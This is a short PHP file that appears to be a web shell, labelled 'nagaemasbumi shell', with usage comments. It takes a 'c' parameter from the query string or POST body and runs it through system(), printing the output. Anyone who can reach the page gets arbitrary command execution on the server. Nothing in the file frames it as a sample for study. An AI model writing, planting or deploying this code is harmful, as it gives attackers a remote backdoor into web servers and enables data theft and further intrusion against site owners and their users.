<?php
// nagaemasbumi shell - full command execution
// Usage: ?c=command or POST c=command
$p=isset($_GET['c'])?$_GET['c']:(isset($_POST['c'])?$_POST['c']:null);
if($p){echo '<pre>';system($p);echo '</pre>';}